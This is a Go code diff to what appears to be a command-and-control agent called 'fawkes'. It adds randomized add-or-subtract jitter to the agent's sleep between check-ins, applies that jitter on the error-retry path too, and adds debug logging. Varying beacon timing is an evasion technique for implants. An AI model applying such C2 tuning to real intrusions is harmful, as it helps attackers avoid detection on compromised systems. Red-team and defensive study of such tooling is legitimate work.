@@ -4,16 +4,16 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"math/rand"
 	"os"
 	"os/signal"
+	"strconv"
+	"strings"
 	"sync"
 	"syscall"
 	"time"
 
 	"github.com/google/uuid"
-
-	"strconv"
-	"strings"
 
 	"fawkes/pkg/commands"
 	"fawkes/pkg/http"
@@ -164,7 +164,12 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 					log.Printf("[ERROR] Maximum retry count reached, exiting")
 					return
 				}
-				time.Sleep(time.Duration(sleepIntervalInt) * time.Second)
+				// Use the same sleep calculation for error case
+				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+				if debugBool {
+					log.Printf("[DEBUG] Sleeping for %v after error", sleepTime)
+				}
+				time.Sleep(sleepTime)
 				continue
 			}
 
@@ -181,6 +186,9 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 
 			// Sleep before next iteration
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+			if debugBool {
+				log.Printf("[DEBUG] Sleeping for %v before next check", sleepTime)
+			}
 			time.Sleep(sleepTime)
 		}
 	}
@@ -216,18 +224,24 @@ func calculateSleepTime(interval, jitter int) time.Duration {
 		return time.Duration(interval) * time.Second
 	}
 
-	// Calculate jitter as percentage of interval
-	jitterAmount := float64(interval) * (float64(jitter) / 100.0)
-	
-	// Random variation between -jitter and +jitter
-	variation := (2*jitterAmount) - jitterAmount // This is simplified, should use proper random
-	
-	actualInterval := float64(interval) + variation
-	if actualInterval < 1 {
-		actualInterval = 1
-	}
+	// Freyja-style jitter calculation
+	// Jitter is a percentage (0-100) that creates variation around the interval
+	jitterFloat := float64(rand.Int()%jitter) / float64(100)
+	jitterDiff := float64(interval) * jitterFloat
 
-	return time.Duration(actualInterval) * time.Second
+	// Randomly add or subtract jitter (50/50 chance)
+	if rand.Int()%2 == 0 {
+		// Add jitter
+		actualInterval := interval + int(jitterDiff)
+		return time.Duration(actualInterval) * time.Second
+	} else {
+		// Subtract jitter
+		actualInterval := interval - int(jitterDiff)
+		if actualInterval < 1 {
+			actualInterval = 1 // Minimum 1 second
+		}
+		return time.Duration(actualInterval) * time.Second
+	}
 }
 
 // Helper functions for system information
